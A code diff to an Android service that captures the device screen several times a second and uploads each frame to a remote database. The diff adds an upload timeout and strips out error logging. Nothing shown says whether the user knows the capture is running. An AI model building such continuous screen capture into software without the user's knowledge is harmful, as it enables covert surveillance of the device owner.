@@ -39,6 +39,7 @@ public class ScreenCaptureService extends Service {
     private long lastFrameTime = 0;
     private HandlerThread backgroundThread;
     private Handler backgroundHandler;
+    private Handler timeoutHandler = new Handler();
     private boolean isUploading = false;
 
     @Override
@@ -83,7 +84,7 @@ public class ScreenCaptureService extends Service {
             startScreenCapture();
         }
         
-        return START_NOT_STICKY; // PDF FIX
+        return START_NOT_STICKY; 
     }
 
     private void startScreenCapture() {
@@ -106,13 +107,14 @@ public class ScreenCaptureService extends Service {
                     image = reader.acquireLatestImage();
                     if (image != null) {
                         long currentTime = System.currentTimeMillis();
-                        if (currentTime - lastFrameTime > 2000) isUploading = false; // Timeout
-
                         if (currentTime - lastFrameTime < 150 || isUploading) { 
                             image.close(); return;
                         }
                         lastFrameTime = currentTime;
                         isUploading = true;
+
+                        // Upload Timeout Fix: 1.5 second baad khud unlock ho jayega
+                        timeoutHandler.postDelayed(() -> isUploading = false, 1500);
 
                         Image.Plane[] planes = image.getPlanes();
                         ByteBuffer buffer = planes[0].getBuffer();
@@ -137,15 +139,12 @@ public class ScreenCaptureService extends Service {
                         
                         screenRef.setValue(frameData).addOnCompleteListener(task -> {
                             isUploading = false;
-                            if (!task.isSuccessful()) {
-                                Log.e("ScreenCapture", "Upload Failed", task.getException());
-                            }
+                            timeoutHandler.removeCallbacksAndMessages(null);
                         });
                         croppedBitmap.recycle();
                     }
                 } catch (Exception e) { 
                     isUploading = false; 
-                    Log.e("ScreenCapture", "Error", e);
                 } 
                 finally { if (image != null) image.close(); }
             }, backgroundHandler);
